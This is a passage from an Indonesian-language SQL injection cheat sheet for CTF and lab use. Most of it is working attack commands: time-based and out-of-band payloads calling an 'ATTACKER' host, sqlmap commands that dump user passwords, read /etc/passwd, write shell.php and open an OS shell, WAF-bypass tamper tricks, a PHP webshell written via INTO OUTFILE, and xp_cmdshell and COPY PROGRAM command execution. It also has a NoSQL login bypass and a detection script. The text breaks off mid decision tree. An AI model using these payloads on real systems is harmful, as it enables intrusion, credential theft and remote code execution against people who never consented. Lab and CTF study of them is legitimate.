Tetapi database dapat dipaksa delay.
```

Contoh:

```text
TRUE  → delay 5 sec
FALSE → normal response
```

---

## Kapan Pilih Time-Based vs Boolean?

|Kondisi|Teknik|
|---|---|
|Output terlihat|UNION / Error-based|
|TRUE/FALSE berbeda|Boolean Blind|
|Tidak ada difference|Time-Based|
|Tidak ada output dan timing tidak stabil|OOB dapat dipertimbangkan|

---

# 5.2 Manual Time-Based Test

## MySQL

```bash
time curl -s -o /dev/null \
'http://TARGET/item?id=10%20AND%20SLEEP(5)'
```

Expected:

```text
real    0m5.1s
```

Baseline:

```bash
time curl -s -o /dev/null \
'http://TARGET/item?id=10'
```

Expected:

```text
real    0m0.1s
```

---

## Threshold

Jangan pakai satu request.

Misalnya:

```text
baseline:
0.15
0.12
0.18
0.14

delayed:
5.12
5.10
5.14
```

Threshold praktis untuk lab:

```text
> baseline mean + several standard deviations
```

Untuk CTF sederhana:

```text
~3–5 seconds
```

biasanya lebih mudah dibedakan daripada delay sangat kecil.

---

# 5.3 Per Database Syntax

|DB|Sleep Command|Example & Catatan Penting|
|---|---|---|
|MySQL|`SLEEP(5)`|`AND SLEEP(5)` atau `AND 1=1-- -`|
|PostgreSQL|`pg_sleep(5)`|`AND 1=(SELECT 1 FROM pg_sleep(5))` atau `;SELECT pg_sleep(5)--`|
|MSSQL|`WAITFOR DELAY '00:00:05'`|`AND 1=1; WAITFOR DELAY '00:00:05'`|
|Oracle|`DBMS_PIPE.RECEIVE_MESSAGE`|`AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0`|
|SQLite|`SELECT sqlite_version()`|Tidak ada native sleep; ekstraksi tabel via `SELECT name FROM sqlite_master WHERE type='table'`|

> ⚠️ **Catatan Teknis PostgreSQL `pg_sleep()`:**
> Fungsi `pg_sleep()` di PostgreSQL mengembalikan tipe `void`. Jika dimasukkan langsung ke klausa `AND pg_sleep(5)` tanpa wrapper subquery, query engine PostgreSQL akan melempar type mismatch error. Gunakan bentuk subquery valid `AND 1=(SELECT 1 FROM pg_sleep(5))` atau stacked query `;SELECT pg_sleep(5)--`.

Contoh PostgreSQL:

```bash
time curl -s -o /dev/null \
'http://TARGET/item?id=10%20AND%201=(SELECT%201%20FROM%20pg_sleep(5))'
```

MSSQL:

```bash
time curl -s -o /dev/null \
'http://TARGET/item?id=10%3BWAITFOR%20DELAY%20%2700:00:05%27'
```

---

# 📡 6. Out-of-Band SQL Injection

# 6.1 Kapan OOB Dipakai

## 📌 Kapan Digunakan

Gunakan ketika:

```text
Tidak ada visible output
AND
Boolean difference tidak terlihat
AND
Time-based tidak reliable
AND
DB/host dapat melakukan external callback
```

Flow:

```text
Application
    │
    ▼
Database
    │
    ▼
DNS / HTTP request
    │
    ▼
Listener controlled by tester
```

---

# 6.2 DNS Exfiltration — Konsep

## MySQL / UNC Path

Pada environment Windows, MySQL functionality tertentu dapat berinteraksi dengan UNC path bila server memiliki permission/network access.

Contoh konsep:

```text
\\ATTACKER\share
```

Dalam lab, callback dapat terlihat pada DNS/SMB infrastructure.

---

## MSSQL — `xp_dirtree`

### 📌 Kapan Digunakan

Pada SQL Server ketika:

```text
xp_dirtree
```

tersedia dan SQL Server dapat membuat network request.

Konsep:

```sql
EXEC master..xp_dirtree '\\ATTACKER\share';
```

---

## Listener

Linux:

```bash
sudo tcpdump -ni any 'port 53 or port 445'
```

Atau:

```bash
sudo tcpdump -ni any host ATTACKER
```

DNS listener:

```bash
sudo tcpdump -ni any port 53
```

HTTP callback listener:

```bash
python3 -m http.server 8000
```

---

## OOB Flow

```text
Injected SQL
    │
    ▼
Database
    │
    ├── DNS lookup
    └── HTTP request
          │
          ▼
       Listener
          │
          ▼
     Callback proves
     code execution path
```

> OOB hanya membuktikan callback jika network egress dan privilege mendukung; kegagalan callback tidak otomatis membuktikan tidak ada SQLi.

---

# 🔁 7. Second-Order SQL Injection

# 7.1 Konsep Second-Order

## 📌 Kapan Digunakan

Ketika payload tidak dieksekusi saat disimpan, tetapi menjadi SQL setelah digunakan kembali.

Diagram:

```text
Input
 │
 ▼
Register / Profile
 │
 ▼
Stored in Database
 │
 ▼
Later Feature
 │
 ▼
Retrieval
 │
 ▼
Dynamic SQL
 │
 ▼
Injection Executes
```

---

## Contoh Konseptual

Register:

```text
username = admin' OR '1'='1
```

Saat register:

```text
No obvious SQLi
```

Tetapi kemudian:

```text
Profile search
Admin report
User lookup
Order history
```

menggunakan data tersimpan dalam query insecure.

---

# 7.2 Cara Identify

## 📌 Kapan Digunakan

Cari fitur:

```text
registration
profile update
comment
ticket
address
username
saved search
```

Register payload harmless untuk lab:

```text
test'-- 
```

Kemudian trigger:

```text
GET /profile
GET /search
GET /admin/report
```

Perhatikan:

```text
SQL error
unexpected result
behavior change
```

---

# 🤖 8. SQLMap Workflow

# 8.1 Instalasi & Verifikasi

## 📌 Kapan Digunakan

Saat manual testing sudah menunjukkan indikasi SQLi dan ingin mengotomasi detection/enumeration.

Di Parrot:

```bash
sudo apt update
sudo apt install sqlmap -y
```

Verifikasi:

```bash
sqlmap --version
```

Contoh:

```text
1.9.x
```

Help:

```bash
sqlmap -h
```

---

# 8.2 Basic Usage

## GET Parameter

### 📌 Kapan Digunakan

```text
http://TARGET/item?id=10
```

Command:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--batch
```

One-liner detection:

```bash
sqlmap -u "http://TARGET/item?id=10" --batch
```

---

## POST Parameter

```bash
sqlmap \
-u "http://TARGET/login" \
--data="username=test&password=test" \
-p username \
--batch
```

---

## Cookie Injection

```bash
sqlmap \
-u "http://TARGET/dashboard" \
--cookie="PHPSESSID=abc123" \
--batch
```

Target cookie spesifik:

```bash
sqlmap \
-u "http://TARGET/" \
--cookie="tracking=abc123" \
-p tracking \
--batch
```

---

## Header Injection

Misalnya `User-Agent`:

```bash
sqlmap \
-u "http://TARGET/" \
--user-agent="test*" \
--batch
```

Atau:

```bash
sqlmap \
-u "http://TARGET/" \
--headers="X-Forwarded-For: 10.0.0.1*" \
--batch
```

---

## JSON Body

Buat:

```bash
cat > request.json <<'EOF'
{
  "username": "test",
  "search": "hello*"
}
EOF
```

Command:

```bash
sqlmap \
-u "http://TARGET/api/search" \
--data-binary @request.json \
-H "Content-Type: application/json" \
--batch
```

Untuk request kompleks, cara paling reliable:

```bash
Burp → Save request → sqlmap -r request.txt
```

---

## Request File

```bash
sqlmap \
-r request.txt \
--batch
```

Ini sangat berguna karena mempertahankan:

```text
headers
cookies
body
method
parameters
```

---

# 8.3 Enumeration dengan SQLMap

## Step 1 — Detect Injectable Parameter

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
-p id \
--batch
```

Contoh:

```text
[INFO] testing 'AND boolean-based blind'
[INFO] testing 'UNION query'
[INFO] parameter 'id' appears to be injectable
```

---

## Step 2 — List Databases

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
-p id \
--dbs \
--batch
```

One-liner:

```bash
sqlmap -u "http://TARGET/item?id=10" -p id --dbs --batch
```

Output:

```text
available databases:
[*] information_schema
[*] shopdb
[*] mysql
[*] performance_schema
```

---

## Step 3 — List Tables

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
-p id \
-D shopdb \
--tables \
--batch
```

Output:

```text
Database: shopdb
[3 tables]
+----------+
| users    |
| products |
| orders   |
+----------+
```

---

## Step 4 — List Columns

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
-p id \
-D shopdb \
-T users \
--columns \
--batch
```

Output:

```text
Database: shopdb
Table: users

+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int         |
| username | varchar     |
| password | varchar     |
| email    | varchar     |
+----------+-------------+
```

---

## Step 5 — Dump Data

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
-p id \
-D shopdb \
-T users \
--dump \
--batch
```

---

## Step 6 — Dump Specific Columns

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
-p id \
-D shopdb \
-T users \
-C username,password \
--dump \
--batch
```

---

## Full One-Liner Sequence

### Detect

```bash
sqlmap -u "http://TARGET/item?id=10" -p id --batch
```

### DBs

```bash
sqlmap -u "http://TARGET/item?id=10" -p id --dbs --batch
```

### Tables

```bash
sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb --tables --batch
```

### Columns

```bash
sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb -T users --columns --batch
```

### Dump

```bash
sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb -T users --dump --batch
```

### Specific columns

```bash
sqlmap -u "http://TARGET/item?id=10" -p id -D shopdb -T users -C username,password --dump --batch
```

---

# 8.4 Advanced SQLMap

## Tamper Scripts

### 📌 Kapan Digunakan

Saat:

```text
SQLi manual terbukti
BUT
WAF memblok request tertentu.
```

List:

```bash
sqlmap --list-tampers
```

---

## Common Tampers

|Tamper|Fungsi|Kapan Dipakai|
|---|---|---|
|`space2comment`|whitespace → comments|WAF memblok spasi|
|`between`|operator `=`/comparison variation|Filter keyword/operator|
|`randomcase`|case randomization|Case-sensitive filtering|
|`charencode`|encode karakter|URL/filter normalization|
|`base64encode`|encode payload|Hanya jika aplikasi melakukan decode base64|
|`equaltolike`|`=` → `LIKE`|Filter operator tertentu|

Contoh:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--tamper=space2comment \
--batch
```

Gabungan:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--tamper=space2comment,randomcase \
--batch
```

**Jangan menambahkan banyak tamper secara acak.** Setiap transformasi dapat merusak payload.

---

## Level dan Risk

### `--level`

```bash
--level=1
```

hingga:

```bash
--level=5
```

Semakin tinggi:

```text
lebih banyak parameter/payload diuji
→ lebih banyak request
→ lebih lambat
```

### `--risk`

```text
--risk=1
--risk=2
--risk=3
```

Risk lebih tinggi dapat menggunakan test yang lebih agresif.

Untuk CTF mulai:

```bash
--level=1 --risk=1
```

Naikkan hanya bila diperlukan.

---

## Proxy melalui Burp

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--proxy="http://127.0.0.1:8080" \
--batch
```

Flow:

```text
SQLMap
  │
  ▼
127.0.0.1:8080
  │
  ▼
Burp Proxy
  │
  ▼
Target
```

---

## `--os-shell`

### 📌 Kapan Digunakan

Hanya setelah SQLMap membuktikan bahwa:

```text
DBMS
+
DB privilege
+
OS interaction primitive
+
server configuration
```

memungkinkan OS command execution.

Command:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--os-shell \
--batch
```

Jika tidak berhasil:

```text
not every SQLi → OS shell
```

---

## File Read

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--file-read="/etc/passwd" \
--batch
```

Windows example:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--file-read="C:/Windows/win.ini" \
--batch
```

---

## File Write

Contoh:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--file-write="shell.php" \
--file-dest="/var/www/html/shell.php" \
--batch
```

Syarat:

```text
database privilege
filesystem permission
correct DBMS primitive
webserver write path
```

---

# 8.5 SQLMap Output Analysis

## Injectable Parameter

Cari:

```text
parameter 'id' is vulnerable
```

---

## Injection Type

Contoh:

```text
boolean-based blind
time-based blind
UNION query
error-based
```

Jangan menyamakan:

```text
"SQLi detected"
```

dengan:

```text
"full database access"
```

Kemampuan tergantung teknik dan privilege.

---

## Database Banner

Contoh:

```text
back-end DBMS: MySQL
banner: 8.0.x
```

---

## Dump Location

SQLMap menyimpan data di:

```text
~/.local/share/sqlmap/
```

Cari:

```bash
find ~/.local/share/sqlmap -type f | head
```

Atau:

```bash
find ~/.local/share/sqlmap -type f | grep -E \
'dump|log|session'
```

---

# 🛡️ 9. WAF Bypass Techniques

# 9.1 Common WAF Detection

## 📌 Kapan Digunakan

Saat request SQLi bekerja secara manual sebelum mendapat block:

```text
403
406
429
```

atau response WAF berubah.

---

## wafw00f

Install:

```bash
sudo apt install wafw00f -y
```

Run:

```bash
wafw00f http://TARGET
```

Contoh:

```text
[*] Checking http://TARGET
[+] The site is behind Cloudflare (Cloudflare)
```

Atau:

```text
[-] No WAF detected
```

---

## Manual WAF Clues

```text
Server:
Via:
X-Cache:
CF-Ray:
X-Sucuri-ID:
403
429
challenge page
CAPTCHA
```

Fingerprint bukan proof absolut.

---

# 9.2 Bypass Techniques

> Bypass syntax hanya relevan jika ada filtering/WAF pada lab. Jangan mengubah payload tanpa mengerti apa yang diblok.

## Case Variation

```sql
SeLeCt
UnIoN
uNiOn SeLeCt
```

Contoh:

```bash
curl -G \
--data-urlencode "id=10 UNION SELECT 1,2,3" \
http://TARGET/item
```

Variant:

```bash
curl -G \
--data-urlencode "id=10 UnIoN SeLeCt 1,2,3" \
http://TARGET/item
```

---

## Comment Injection

MySQL-style:

```sql
/*!UNION*/ /*!SELECT*/ 1,2,3
```

Contoh:

```bash
curl -G \
--data-urlencode \
"id=10 /*!UNION*/ /*!SELECT*/ 1,2,3" \
http://TARGET/item
```

---

## URL Encoding

```bash
curl -G \
--data-urlencode \
"id=10 UNION SELECT 1,2,3" \
http://TARGET/item
```

`--data-urlencode` membantu melakukan encoding karakter yang diperlukan.

---

## Double Encoding

Misalnya `%` menjadi `%25`.

Gunakan hanya jika aplikasi/proxy mendecode lebih dari satu kali.

Konsep:

```text
'        → %27
%27      → %2527
```

Jangan menganggap double encoding akan selalu bekerja.

---

## Whitespace Alternatives

Tergantung DB:

```text
space
tab
newline
comment
```

MySQL comment:

```sql
SELECT/**/1
```

---

## Keyword Splitting

Pada filtering buruk:

```sql
UNION SELECT
```

dapat menjadi:

```sql
UN/**/ION/**/SEL/**/ECT
```

Tetapi parser/WAF modern dapat melakukan normalization, sehingga hasilnya sangat implementation-specific.

---

# 9.3 SQLMap Tamper Scripts

|Tamper Script|Fungsi|Kapan Dipakai|
|---|---|---|
|`space2comment`|ganti spasi dengan comment|Spasi difilter|
|`between`|ubah comparison|Filter operator tertentu|
|`randomcase`|randomisasi case|Filter keyword sederhana|
|`charencode`|encode karakter|Filter character|
|`base64encode`|Base64 payload|Aplikasi memang decode Base64|
|`equaltolike`|`=` menjadi `LIKE`|`=` diblok|

Contoh:

```bash
sqlmap \
-u "http://TARGET/item?id=10" \
--tamper=space2comment \
--batch
```

Urutan troubleshooting:

```text
Manual payload
      │
      ▼
Understand block
      │
      ▼
One tamper
      │
      ▼
Retest
      │
      ▼
Second tamper only if needed
```

---

# 🧱 10. Stacked Queries

# 10.1 Kapan Stacked Queries Bisa Dipakai

## 📌 Kapan Digunakan

Saat DBMS/driver memungkinkan lebih dari satu statement dieksekusi dalam satu request.

Konsep:

```sql
SELECT ...
;
SELECT ...
```

---

## Support Matrix

|DB|Stacked Query Support|Catatan|
|---|---|---|
|MySQL|Tergantung driver/API|Multi-statements harus di-enable pada banyak connector|
|PostgreSQL|Umumnya mendukung multiple statements tertentu|Driver/application behavior penting|
|MSSQL|Ya|`;` sering digunakan|
|Oracle|Berbeda|PL/SQL context memiliki aturan sendiri|
|SQLite|API-dependent|Multiple statements tergantung wrapper|

---

## Test

MSSQL:

```text
10;SELECT 1--
```

PostgreSQL:

```text
10;SELECT 1--
```

MySQL:

```text
10;SELECT 1-- -
```

Jika menghasilkan syntax error atau query tidak dijalankan, jangan menganggap stacked queries tersedia.

---

# 10.2 RCE via Stacked Queries

## MSSQL — `xp_cmdshell`

### 📌 Kapan Digunakan

Hanya ketika:

```text
MSSQL
+
stacked query
+
permission
+
xp_cmdshell available/enabled
```

Concept:

```sql
EXEC xp_cmdshell 'whoami';
```

---

## MySQL — INTO OUTFILE

Dapat digunakan untuk menulis file jika:

```text
FILE privilege
+
secure_file_priv permitting destination
+
filesystem writable
```

---

## PostgreSQL — COPY

PostgreSQL versi/configuration tertentu mendukung `COPY ... PROGRAM` untuk menjalankan program OS ketika user DB mempunyai privilege yang sesuai.

---

# 💻 11. SQL Injection to RCE

> Ini adalah **post-exploitation escalation path**, bukan kemampuan default SQLi.

---

# 11.1 MySQL — INTO OUTFILE

## 📌 Kapan Digunakan

Saat:

```text
FILE privilege tersedia
secure_file_priv tidak menghalangi target directory
web root writable
web server akan mengeksekusi file
```

---

## Cek Privilege

```sql
SELECT FILE_PRIVILEGES
FROM information_schema.user_privileges;
```

Atau:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Contoh:

```text
secure_file_priv = NULL
```

berarti konfigurasi tidak mengizinkan mekanisme tertentu.

Contoh lain:

```text
secure_file_priv = /var/lib/mysql-files/
```

berarti write dibatasi ke directory tersebut.

---

## Webshell — Lab Only

Contoh sangat sederhana:

```sql
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';
```

Kemudian:

```bash
curl 'http://TARGET/shell.php?cmd=id'
```

Expected:

```text
uid=33(www-data) gid=33(www-data)
```

> Ini hanya cocok untuk lab. Kemampuan tersebut memerlukan seluruh precondition di atas.

---

# 11.2 MSSQL — xp_cmdshell

## 📌 Kapan Digunakan

Jika `xp_cmdshell` tersedia dan account DB memiliki privilege yang memadai.

Check:

```sql
EXEC xp_cmdshell 'whoami';
```

Expected:

```text
nt service\mssqlserver
```

atau user service account lainnya.

---

## Enable pada Lab

Konfigurasi klasik:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Kemudian:

```sql
EXEC xp_cmdshell 'whoami';
```

---

## Upgrade ke Command Execution

Uji dahulu:

```sql
EXEC xp_cmdshell 'hostname';
```

Kemudian:

```sql
EXEC xp_cmdshell 'whoami';
```

Untuk CTF biasanya tahap berikutnya adalah membangun shell callback dari command execution, tetapi keberhasilannya bergantung pada outbound connectivity, quoting, privilege, dan OS.

---

# 11.3 PostgreSQL — COPY TO/FROM PROGRAM

## 📌 Kapan Digunakan

Saat:

```text
PostgreSQL
+
superuser/appropriate privilege
+
COPY ... PROGRAM available
```

Contoh:

```sql
COPY (SELECT '') TO PROGRAM 'id';
```

atau:

```sql
COPY test FROM PROGRAM 'id';
```

Expected:

```text
command output / execution side effect
```

Pada PostgreSQL, privilege untuk `COPY PROGRAM` sangat penting.

---

# 🍃 12. NoSQL Injection

# 12.1 MongoDB Injection

## 📌 Kapan Digunakan

Saat aplikasi menggunakan MongoDB dan input user langsung dimasukkan ke query/object.

Contoh insecure logic:

```javascript
db.users.findOne({
    username: req.body.username,
    password: req.body.password
})
```

---

## `$ne`

Conceptual payload:

```json
{
  "username": "admin",
  "password": {
    "$ne": null
  }
}
```

---

## `$regex`

```json
{
  "username": {
    "$regex": "^admin"
  }
}
```

---

## `$where`

Legacy/unsafe pattern:

```json
{
  "$where": "this.username == 'admin'"
}
```

`$where` memiliki risiko tambahan dan bukan pilihan utama MongoDB modern.

---

## Authentication Bypass Concept

Jika backend menerima object operator langsung:

```text
password = {"$ne": null}
```

maka query:

```text
password != null
```

dapat membuat login bypass pada implementasi tertentu.

---

# 12.2 Cara Test NoSQL Injection

## Identify Endpoint

Cari:

```text
MongoDB
mongoose
mongodb://
MongoClient
findOne(
find(
aggregate(
```

Source code:

```bash
curl -s http://TARGET/app.js | grep -Ei \
'mongodb|mongoose|findOne|MongoClient'
```

---

## JSON Test

```bash
curl -i -X POST http://TARGET/login \
-H 'Content-Type: application/json' \
-d '{"username":"admin","password":{"$ne":null}}'
```

Compare dengan:

```bash
curl -i -X POST http://TARGET/login \
-H 'Content-Type: application/json' \
-d '{"username":"admin","password":"wrong"}'
```

Potential indication:

```text
wrong password → 401
$ne payload     → 200
```

---

# 📨 13. Special Contexts

# 13.1 SQLi dalam Cookie

## 📌 Kapan Digunakan

Saat aplikasi memakai cookie sebagai database lookup/filter.

Test:

```bash
curl -i http://TARGET/profile \
-H "Cookie: user=admin'"
```

Boolean:

```bash
curl -i http://TARGET/profile \
-H "Cookie: user=admin' AND 1=1-- -"
```

False:

```bash
curl -i http://TARGET/profile \
-H "Cookie: user=admin' AND 1=2-- -"
```

---

# 13.2 SQLi dalam HTTP Header

## 📌 Kapan Digunakan

Saat backend menyimpan/logging header lalu memakainya dalam query.

### User-Agent

```bash
curl -i http://TARGET/ \
-H "User-Agent: test'"
```

Boolean:

```bash
curl -i http://TARGET/ \
-H "User-Agent: test' AND 1=1-- -"
```

### X-Forwarded-For

```bash
curl -i http://TARGET/ \
-H "X-Forwarded-For: 10.0.0.1'"
```

### Referer

```bash
curl -i http://TARGET/ \
-H "Referer: http://example.com/'"
```

Perhatikan bahwa header injection harus punya sink server-side; header yang hanya ditampilkan oleh proxy tidak berarti SQLi.

---

# 13.3 SQLi dalam JSON Body

## 📌 Kapan Digunakan

Saat API menerima structured JSON.

Baseline:

```bash
curl -i -X POST http://TARGET/api/item \
-H 'Content-Type: application/json' \
-d '{"id":10}'
```

Test:

```bash
curl -i -X POST http://TARGET/api/item \
-H 'Content-Type: application/json' \
-d '{"id":"10'\"'\"'"}'
```

Boolean:

```bash
curl -i -X POST http://TARGET/api/item \
-H 'Content-Type: application/json' \
-d '{"id":"10 AND 1=1"}'
```

---

# 13.4 SQLi dalam XML

## 📌 Kapan Digunakan

Ketika API menerima XML dan nilai XML akhirnya masuk ke SQL query.

Contoh:

```bash
curl -i -X POST http://TARGET/api \
-H 'Content-Type: application/xml' \
--data-binary @- <<'EOF'
<request>
  <id>10'</id>
</request>
EOF
```

Boolean:

```bash
curl -i -X POST http://TARGET/api \
-H 'Content-Type: application/xml' \
--data-binary @- <<'EOF'
<request>
  <id>10 AND 1=1</id>
</request>
EOF
```

---

# 13.5 ORM Injection

## 📌 Kapan Digunakan
Ketika aplikasi web modern menggunakan framework Object-Relational Mapping (ORM) seperti:
- **SQLAlchemy** (Python)
- **Hibernate** (Java)
- **Sequelize** (Node.js)
- **Eloquent** (PHP / Laravel)

Meskipun ORM secara default mengamankan query dengan parameter binding, kerentanan SQLi tetap terjadi jika developer menggunakan *raw query*, raw expressions, atau string concatenation/formatting langsung ke dalam query builder.

### 1. SQLAlchemy (Python) — Raw Query Vulnerable vs Safe

```python
# ❌ VULNERABLE: String formatting / f-string langsung ke raw query
query = f"SELECT * FROM users WHERE name='{user_input}'"
db.session.execute(query)

# ✅ SAFE: Menggunakan parameter binding bawaan ORM
db.session.execute("SELECT * FROM users WHERE name=:name", {"name": user_input})
# ATAU query builder murni:
User.query.filter_by(name=user_input).first()
```

### 2. Sequelize (Node.js) — Raw Expressions

```javascript
// ❌ VULNERABLE: Penggunaan sequelize.literal() dengan template literal
User.findAll({ 
    where: sequelize.literal(`name='${user_input}'`) 
});

// ✅ SAFE: Menggunakan parameter object standar Sequelize
User.findAll({ 
    where: { name: user_input } 
});
```

### 3. Eloquent (PHP / Laravel) — Raw Methods

```php
// ❌ VULNERABLE: whereRaw() dengan interpolasi string
User::whereRaw("email = '{$email}'")->get();

// ✅ SAFE: whereRaw() dengan parameter binding array
User::whereRaw("email = ?", [$email])->get();
```

### 🔍 Cara Test ORM Injection
Metodologi pengujian ORM Injection identik dengan SQL Injection biasa:
1. Masukkan single quote (`'`) atau double quote (`"`) untuk memicu syntax error backend.
2. Gunakan boolean difference: `' OR '1'='1` vs `' AND '1'='2`.
3. Jika raw query dieksekusi di backend SQL (MySQL/PostgreSQL/SQLite), seluruh teknik UNION, Error-based, atau Time-based dapat diterapkan seperti biasa.

---

# ⚙️ 14. Automation Scripts

# 14.1 Script `sqli_detect.sh`

## 📌 Kapan Digunakan

Untuk screening awal parameter yang sudah Anda curigai.

Input:

```text
URL
parameter
```

Output:

```text
baseline
quote test
boolean TRUE
boolean FALSE
possible error
possible time delay
```

```bash
#!/usr/bin/env bash

set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <url> <parameter>"
    exit 1
}

[[ $# -eq 2 ]] || usage

URL="$1"
PARAM="$2"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
    exit 1
fi

if [[ "$URL" =~ [[:space:]] ]]; then
    echo -e "${RED}[!] URL contains whitespace${NC}"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo -e "${RED}[!] Invalid parameter name${NC}"
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo -e "${RED}[!] curl is required${NC}"
    exit 1
fi

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

echo -e "${BLUE}[*] URL       : $URL${NC}"
echo -e "${BLUE}[*] Parameter : $PARAM${NC}"

echo
echo -e "${YELLOW}[1] Baseline${NC}"

BASE_TIME="$(
    curl -ksS \
    -o "$TMP/base" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=10" \
    "$URL"
)"

BASE_SIZE="$(wc -c < "$TMP/base")"

echo "    time = ${BASE_TIME}s"
echo "    size = ${BASE_SIZE}"

echo
echo -e "${YELLOW}[2] Single quote test${NC}"

QUOTE_TIME="$(
    curl -ksS \
    -o "$TMP/quote" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=10'" \
    "$URL"
)"

QUOTE_SIZE="$(wc -c < "$TMP/quote")"

echo "    time = ${QUOTE_TIME}s"
echo "    size = ${QUOTE_SIZE}"

if grep -Eqi \
    'sql syntax|mysql|mariadb|postgresql|pgsql|sql server|oracle|sqlite|syntax error|pdoexception' \
    "$TMP/quote"; then

    echo -e "${RED}[+] SQL error indicator detected${NC}"
else
    echo "[-] No obvious SQL error"
fi

echo
echo -e "${YELLOW}[3] Boolean TRUE test${NC}"

TRUE_TIME="$(
    curl -ksS \
    -o "$TMP/true" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=10 AND 1=1" \
    "$URL"
)"

TRUE_SIZE="$(wc -c < "$TMP/true")"

echo "    time = ${TRUE_TIME}s"
echo "    size = ${TRUE_SIZE}"

echo
echo -e "${YELLOW}[4] Boolean FALSE test${NC}"

FALSE_TIME="$(
    curl -ksS \
    -o "$TMP/false" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=10 AND 1=2" \
    "$URL"
)"

FALSE_SIZE="$(wc -c < "$TMP/false")"

echo "    time = ${FALSE_TIME}s"
echo "    size = ${FALSE_SIZE}"

if [[ "$TRUE_SIZE" != "$FALSE_SIZE" ]]; then
    echo -e "${GREEN}[+] Response-size difference detected${NC}"
    echo -e "${GREEN}[+] Boolean blind candidate${NC}"
else
    echo "[-] No obvious boolean size difference"
fi

echo
echo -e "${YELLOW}[5] Time-based test${NC}"

TIME_TIME="$(
    curl -ksS \
    -o "$TMP/time" \
    -w '%{time_total}' \
    --get \
    --data-urlencode "${PARAM}=10 AND SLEEP(5)" \
    "$URL"
)"

echo "    time = ${TIME_TIME}s"

if awk -v t="$TIME_TIME" 'BEGIN { exit !(t >= 4.0) }'; then
    echo -e "${GREEN}[+] Possible time-based SQLi${NC}"
else
    echo "[-] No obvious 5-second delay"
fi

echo
echo -e "${YELLOW}=== Summary ===${NC}"
echo "Baseline : ${BASE_TIME}s / ${BASE_SIZE} bytes"
echo "Quote    : ${QUOTE_TIME}s / ${QUOTE_SIZE} bytes"
echo "TRUE     : ${TRUE_TIME}s / ${TRUE_SIZE} bytes"
echo "FALSE    : ${FALSE_TIME}s / ${FALSE_SIZE} bytes"
echo "SLEEP    : ${TIME_TIME}s"

echo
echo -e "${YELLOW}Next steps:${NC}"
echo "1. Confirm DB type"
echo "2. Determine injection context"
echo "3. Determine column count if UNION candidate"
echo "4. Validate manually with Burp"
echo "5. Use sqlmap after manual confirmation"
```

Jalankan:

```bash
chmod +x sqli_detect.sh
./sqli_detect.sh 'http://TARGET/item' id
```

> Script ini memakai sintaks `AND SLEEP(5)` untuk test time-based, sehingga bagian tersebut secara native paling cocok untuk MySQL/MariaDB. Untuk DB lain, ubah expression delay.

---

# 14.2 One-Liners

## Quick Boolean Test

```bash
curl -s -o true.txt 'http://TARGET/item?id=10%20AND%201=1'; curl -s -o false.txt 'http://TARGET/item?id=10%20AND%201=2'; wc -c true.txt false.txt
```

---

## Quick Error Test

```bash
curl -i --get --data-urlencode "id=10'" http://TARGET/item
```

---

## Quick Time Test — MySQL

```bash
time curl -s -o /dev/null --get --data-urlencode "id=10 AND SLEEP(5)" http://TARGET/item
```

---

## Quick UNION Test

```bash
curl -s --get --data-urlencode "id=10 UNION SELECT NULL,NULL,NULL-- -" http://TARGET/item
```

---

## Quick sqlmap Detect

```bash
sqlmap -u "http://TARGET/item?id=10" -p id --batch
```

---

# 🌳 15. Decision Tree

## SQL Injection Standalone Decision Tree

```text
TRIGGER:
Ditemukan input parameter
        │
        ▼
Test dengan single quote
        │
        ├── SQL Error
        │      │
        │      ▼
        │   Error-Based SQLi
        │
        ├── Generic Error
        │      │
        │      ▼
        │   Test Boolean / Time
        │
        ├── No Difference
        │      │
        │      ├── Test encoded quote
        │      ├── Test numeric context
        │      ├── Test other parameter
        │      └── Inspect request/response
        │
        └── Behavior Change
               │
               ▼
          Boolean Blind Candidate
               │
               ├── UNION works?
               │       │
               │       ├── YES
               │       │    │
               │       │    ▼
               │       │  Determine columns
               │       │    │
               │       │    ▼
               │       │  Find visible column
               │       │    │
               │       │    ▼
               │       │  Enumerate DB
               │       │    │
               │       │    ▼
               │       │  Tables
               │       │    │
               │       │    ▼
               │       │  Columns
               │       │    │
               │       │    ▼
               │       │  Data
               │       │
               │       └── NO
               │            │
               │            ▼
               │        Blind SQLi
               │            │
               │            ├── Boolean
               │            │
               │            └── Time-Based
               │
               ▼
          WAF / Filtering?
               │
          ┌────┴────┐
         YES        NO
          │          │
          ▼          ▼
       Fingerprint  sqlmap
          │
          ▼
       Tamper only
       as required
```

---

## Database-Specific Decision

```text
DB Identified
     │
     ├── MySQL
     │    ├── database()
     │    ├── SLEEP()
